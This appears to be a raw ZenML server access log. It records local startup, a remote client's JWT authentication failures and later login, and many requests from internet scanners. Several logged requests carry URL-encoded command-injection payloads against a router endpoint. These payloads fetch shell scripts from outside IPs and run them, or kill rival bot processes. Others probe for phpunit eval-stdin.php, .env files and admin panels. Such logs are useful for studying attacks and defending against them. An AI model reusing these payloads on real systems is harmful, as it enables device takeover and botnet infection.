[1;35mLoading service daemon configuration from /root/ApartmentPrice/services/zenml/zen_server/local/service.json[0m
[1;35mStarting ZenML Server as blocking process... press CTRL+C once to stop it.[0m
INFO:     Started server process [4516]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://127.0.0.1:8237 (Press CTRL+C to quit)
INFO:     127.0.0.1:38332 - "HEAD /health HTTP/1.1" 200 OK
INFO:     127.0.0.1:38348 - "HEAD /health HTTP/1.1" 200 OK
INFO:     127.0.0.1:38356 - "HEAD /health HTTP/1.1" 200 OK
INFO:     127.0.0.1:38360 - "HEAD /health HTTP/1.1" 200 OK
INFO:     127.0.0.1:38362 - "HEAD /health HTTP/1.1" 200 OK
INFO:     127.0.0.1:38378 - "HEAD /health HTTP/1.1" 200 OK
INFO:     127.0.0.1:38380 - "POST /api/v1/login HTTP/1.1" 200 OK
INFO:     127.0.0.1:36966 - "GET /api/v1/info HTTP/1.1" 200 OK
INFO:     127.0.0.1:36966 - "GET /api/v1/workspaces/default?hydrate=True HTTP/1.1" 200 OK
INFO:     127.0.0.1:36966 - "GET /api/v1/stacks/7f33c402-c8fa-4290-bc2a-51ebe45f53cf?hydrate=True HTTP/1.1" 200 OK
INFO:     127.0.0.1:36966 - "GET /api/v1/info HTTP/1.1" 200 OK
INFO:     127.0.0.1:36966 - "GET /api/v1/current-user?hydrate=True HTTP/1.1" 200 OK
INFO:     127.0.0.1:36966 - "GET /api/v1/info HTTP/1.1" 200 OK
INFO:     77.238.243.73:0 - "GET /workspaces/default HTTP/1.0" 200 OK
[1;35mGot token from cookie[0m
[31mAuthentication error: error decoding access token[0m
Traceback (most recent call last):
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/zenml/zen_server/jwt.py", line 79, in decode_token
    claims_data = jwt.decode(
                  ^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jwt.py", line 210, in decode
    decoded = self.decode_complete(
              ^^^^^^^^^^^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jwt.py", line 151, in decode_complete
    decoded = api_jws.decode_complete(
              ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jws.py", line 209, in decode_complete
    self._verify_signature(signing_input, header, signature, key, algorithms)
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jws.py", line 310, in _verify_signature
    raise InvalidSignatureError("Signature verification failed")
jwt.exceptions.InvalidSignatureError: Signature verification failed

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/zenml/zen_server/auth.py", line 238, in authenticate_credentials
    decoded_token = JWTToken.decode_token(
                    ^^^^^^^^^^^^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/zenml/zen_server/jwt.py", line 90, in decode_token
    raise AuthorizationException(f"Invalid JWT token: {e}") from e
zenml.exceptions.AuthorizationException: Invalid JWT token: Signature verification failed
INFO:     77.238.243.73:0 - "GET /api/v1/workspaces HTTP/1.0" 401 Unauthorized
INFO:     77.238.243.73:0 - "GET /api/v1/info HTTP/1.0" 200 OK
[1;35mGot token from cookie[0m
[1;35mGot token from cookie[0m
[31mAuthentication error: error decoding access token[0m
Traceback (most recent call last):
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/zenml/zen_server/jwt.py", line 79, in decode_token
    claims_data = jwt.decode(
                  ^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jwt.py", line 210, in decode
    decoded = self.decode_complete(
              ^^^^^^^^^^^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jwt.py", line 151, in decode_complete
    decoded = api_jws.decode_complete(
              ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jws.py", line 209, in decode_complete
    self._verify_signature(signing_input, header, signature, key, algorithms)
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jws.py", line 310, in _verify_signature
    raise InvalidSignatureError("Signature verification failed")
jwt.exceptions.InvalidSignatureError: Signature verification failed

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/zenml/zen_server/auth.py", line 238, in authenticate_credentials
    decoded_token = JWTToken.decode_token(
                    ^^^^^^^^^^^^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/zenml/zen_server/jwt.py", line 90, in decode_token
    raise AuthorizationException(f"Invalid JWT token: {e}") from e
zenml.exceptions.AuthorizationException: Invalid JWT token: Signature verification failed
INFO:     77.238.243.73:0 - "GET /api/v1/workspaces/default/statistics HTTP/1.0" 401 Unauthorized
[31mAuthentication error: error decoding access token[0m
Traceback (most recent call last):
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/zenml/zen_server/jwt.py", line 79, in decode_token
    claims_data = jwt.decode(
                  ^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jwt.py", line 210, in decode
    decoded = self.decode_complete(
              ^^^^^^^^^^^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jwt.py", line 151, in decode_complete
    decoded = api_jws.decode_complete(
              ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jws.py", line 209, in decode_complete
    self._verify_signature(signing_input, header, signature, key, algorithms)
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jws.py", line 310, in _verify_signature
    raise InvalidSignatureError("Signature verification failed")
jwt.exceptions.InvalidSignatureError: Signature verification failed

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/zenml/zen_server/auth.py", line 238, in authenticate_credentials
    decoded_token = JWTToken.decode_token(
                    ^^^^^^^^^^^^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/zenml/zen_server/jwt.py", line 90, in decode_token
    raise AuthorizationException(f"Invalid JWT token: {e}") from e
zenml.exceptions.AuthorizationException: Invalid JWT token: Signature verification failed
INFO:     77.238.243.73:0 - "GET /api/v1/users?hydrate=true&size=1000&page=1 HTTP/1.0" 401 Unauthorized
INFO:     77.238.243.73:0 - "GET /api/v1/info HTTP/1.0" 200 OK
[1;35mGot token from cookie[0m
[31mAuthentication error: error decoding access token[0m
Traceback (most recent call last):
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/zenml/zen_server/jwt.py", line 79, in decode_token
    claims_data = jwt.decode(
                  ^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jwt.py", line 210, in decode
    decoded = self.decode_complete(
              ^^^^^^^^^^^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jwt.py", line 151, in decode_complete
    decoded = api_jws.decode_complete(
              ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jws.py", line 209, in decode_complete
    self._verify_signature(signing_input, header, signature, key, algorithms)
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/jwt/api_jws.py", line 310, in _verify_signature
    raise InvalidSignatureError("Signature verification failed")
jwt.exceptions.InvalidSignatureError: Signature verification failed

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/zenml/zen_server/auth.py", line 238, in authenticate_credentials
    decoded_token = JWTToken.decode_token(
                    ^^^^^^^^^^^^^^^^^^^^^^
  File "/root/anaconda3/envs/mlops/lib/python3.11/site-packages/zenml/zen_server/jwt.py", line 90, in decode_token
    raise AuthorizationException(f"Invalid JWT token: {e}") from e
zenml.exceptions.AuthorizationException: Invalid JWT token: Signature verification failed
INFO:     77.238.243.73:0 - "GET /api/v1/workspaces HTTP/1.0" 401 Unauthorized
INFO:     77.238.243.73:0 - "POST /api/v1/login HTTP/1.0" 200 OK
[1;35mGot token from cookie[0m
[1;35mGot token from cookie[0m
[1;35mGot token from cookie[0m
INFO:     77.238.243.73:0 - "GET /api/v1/workspaces HTTP/1.0" 200 OK
[1;35mGot token from cookie[0m
INFO:     77.238.243.73:0 - "GET /api/v1/component-types HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /api/v1/current-user HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /api/v1/users?hydrate=true&size=1000&page=1 HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /api/v1/info HTTP/1.0" 200 OK
[1;35mGot token from cookie[0m
INFO:     77.238.243.73:0 - "GET /api/v1/workspaces HTTP/1.0" 200 OK
[1;35mGot token from cookie[0m
[1;35mGot token from cookie[0m
INFO:     77.238.243.73:0 - "GET /api/v1/workspaces/default/statistics HTTP/1.0" 200 OK
INFO:     77.238.243.73:0 - "GET /api/v1/users?hydrate=true&size=1000&page=1 HTTP/1.0" 200 OK
INFO:     82.96.132.178:0 - "GET / HTTP/1.0" 200 OK
INFO:     52.228.152.136:0 - "GET /portal/redlion HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     31.220.1.83:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     185.224.128.74:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.83.249:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.19.143.27:0 - "GET / HTTP/1.0" 200 OK
INFO:     104.40.75.182:0 - "GET /manager/html HTTP/1.0" 200 OK
INFO:     109.111.170.154:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.74:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.83.66.122:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.83.66.83:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     31.220.1.83:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     167.94.145.107:0 - "GET / HTTP/1.0" 200 OK
INFO:     167.94.145.107:0 - "GET / HTTP/1.0" 200 OK
INFO:     167.94.145.107:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     2.57.122.161:0 - "GET /3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/ HTTP/1.0" 200 OK
INFO:     31.220.1.83:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.0" 200 OK
INFO:     205.210.31.242:0 - "GET / HTTP/1.0" 200 OK
INFO:     152.32.157.3:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     104.199.31.214:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.242.226.99:0 - "GET / HTTP/1.0" 200 OK
INFO:     178.18.106.164:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     185.242.226.99:0 - "GET /favicon.png HTTP/1.0" 404 Not Found
INFO:     185.242.226.99:0 - "GET / HTTP/1.0" 200 OK
INFO:     101.128.67.200:0 - "GET / HTTP/1.0" 200 OK
INFO:     162.216.149.25:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     95.108.213.220:0 - "GET /robots.txt HTTP/1.0" 200 OK
INFO:     95.108.213.246:0 - "GET /favicon.png HTTP/1.0" 404 Not Found
INFO:     103.70.147.10:0 - "GET / HTTP/1.0" 200 OK
INFO:     138.255.222.182:0 - "GET / HTTP/1.0" 200 OK
INFO:     213.59.129.241:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     213.180.203.138:0 - "GET /robots.txt HTTP/1.0" 200 OK
INFO:     87.250.224.210:0 - "GET /favicon.png HTTP/1.0" 404 Not Found
INFO:     103.79.218.35:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     62.78.43.28:0 - "GET / HTTP/1.0" 200 OK
INFO:     51.158.205.47:0 - "GET / HTTP/1.0" 200 OK
INFO:     13.91.177.234:0 - "GET / HTTP/1.0" 200 OK
INFO:     170.64.210.122:0 - "GET / HTTP/1.0" 200 OK
INFO:     170.64.210.122:0 - "GET /form.html HTTP/1.0" 404 Not Found
INFO:     170.64.210.122:0 - "GET /upl.php HTTP/1.0" 404 Not Found
INFO:     170.64.210.122:0 - "GET /geoip/ HTTP/1.0" 200 OK
INFO:     170.64.210.122:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     170.64.210.122:0 - "GET /1.php HTTP/1.0" 404 Not Found
INFO:     170.64.210.122:0 - "GET /bundle.js HTTP/1.0" 404 Not Found
INFO:     170.64.210.122:0 - "GET /files/ HTTP/1.0" 200 OK
INFO:     170.64.210.122:0 - "GET /systembc/password.php HTTP/1.0" 200 OK
INFO:     170.64.210.122:0 - "GET /password.php HTTP/1.0" 404 Not Found
INFO:     170.64.210.122:0 - "GET /info.php HTTP/1.0" 404 Not Found
INFO:     67.217.60.61:0 - "HEAD / HTTP/1.0" 405 Method Not Allowed
INFO:     93.125.10.207:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.174.191.29:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     83.97.73.245:0 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 OK
INFO:     148.153.45.234:0 - "GET /WcYI HTTP/1.0" 404 Not Found
INFO:     148.153.45.234:0 - "GET /8Jfu HTTP/1.0" 404 Not Found
INFO:     148.153.45.234:0 - "GET /aab8 HTTP/1.0" 404 Not Found
INFO:     148.153.45.234:0 - "GET /jquery-3.3.1.slim.min.js HTTP/1.0" 404 Not Found
INFO:     148.153.45.234:0 - "GET /aab9 HTTP/1.0" 404 Not Found
INFO:     148.153.45.234:0 - "GET /jquery-3.3.2.slim.min.js HTTP/1.0" 404 Not Found
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     83.97.73.245:0 - "GET /actuator/gateway/routes HTTP/1.0" 200 OK
INFO:     13.83.43.8:0 - "GET /hudson HTTP/1.0" 404 Not Found
INFO:     88.248.102.172:0 - "GET / HTTP/1.0" 200 OK
INFO:     20.118.71.64:0 - "GET /druid/index.html HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     39.101.172.248:0 - "GET /phpmyadmin HTTP/1.0" 404 Not Found
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     64.62.197.94:0 - "GET / HTTP/1.0" 200 OK
INFO:     64.62.197.93:0 - "GET /webui/ HTTP/1.0" 200 OK
INFO:     64.62.197.102:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     64.62.197.97:0 - "GET /geoserver/web/ HTTP/1.0" 200 OK
INFO:     94.156.68.162:0 - "GET /.env HTTP/1.0" 404 Not Found
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     190.19.83.68:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.224.128.43:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     218.103.163.211:0 - "GET / HTTP/1.0" 200 OK
INFO:     59.188.108.76:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.0" 200 OK
INFO:     167.94.138.61:0 - "GET / HTTP/1.0" 200 OK
INFO:     167.94.138.61:0 - "GET / HTTP/1.0" 200 OK
INFO:     167.94.138.61:0 - "GET /favicon.ico HTTP/1.0" 200 OK
INFO:     57.151.48.106:0 - "GET /actuator/health HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     94.156.68.162:0 - "GET /_profiler/phpinfo HTTP/1.0" 200 OK
INFO:     87.121.69.24:0 - "GET / HTTP/1.0" 200 OK
INFO:     134.122.85.31:0 - "GET / HTTP/1.0" 200 OK
INFO:     134.122.85.31:0 - "OPTIONS / HTTP/1.0" 405 Method Not Allowed
INFO:     134.122.85.31:0 - "POST /sdk HTTP/1.0" 405 Method Not Allowed
INFO:     134.122.85.31:0 - "GET / HTTP/1.0" 200 OK
INFO:     134.122.85.31:0 - "GET /odinhttpcall1720978282 HTTP/1.0" 404 Not Found
INFO:     134.122.85.31:0 - "GET /evox/about HTTP/1.0" 200 OK
INFO:     134.122.85.31:0 - "GET /HNAP1 HTTP/1.0" 404 Not Found
INFO:     134.122.85.31:0 - "GET / HTTP/1.0" 200 OK
INFO:     134.122.85.31:0 - "GET / HTTP/1.0" 200 OK
INFO:     46.101.142.185:0 - "GET /cgi-bin/authLogin.cgi HTTP/1.0" 200 OK
INFO:     159.89.101.90:0 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.0" 200 OK
INFO:     167.99.244.208:0 - "GET /v2/_catalog HTTP/1.0" 200 OK
INFO:     159.89.101.90:0 - "GET /solr/admin/info/system HTTP/1.0" 200 OK
INFO:     165.232.112.16:0 - "GET / HTTP/1.0" 200 OK
INFO:     159.89.101.90:0 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.0" 200 OK
INFO:     46.174.191.29:0 - "GET / HTTP/1.0" 200 OK
INFO:     96.19.62.207:0 - "GET / HTTP/1.0" 200 OK
INFO:     85.133.221.67:0 - "POST /boaform/admin/formLogin HTTP/1.0" 405 Method Not Allowed
INFO:     154.212.141.220:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     92.249.48.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     185.191.126.213:0 - "GET / HTTP/1.0" 200 OK
INFO:     77.163.207.12:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     45.148.10.202:0 - "GET / HTTP/1.0" 200 OK
INFO:     141.98.11.189:0 - "GET / HTTP/1.0" 200 OK
INFO:     149.50.103.48:0 - "GET / HTTP/1.0" 200 OK
INFO:     188.166.165.226:0 - "GET / HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 Not Found
INFO:     101.44.222.193:0 - "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
INFO:     101.44.222.193:0 - "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 200 OK
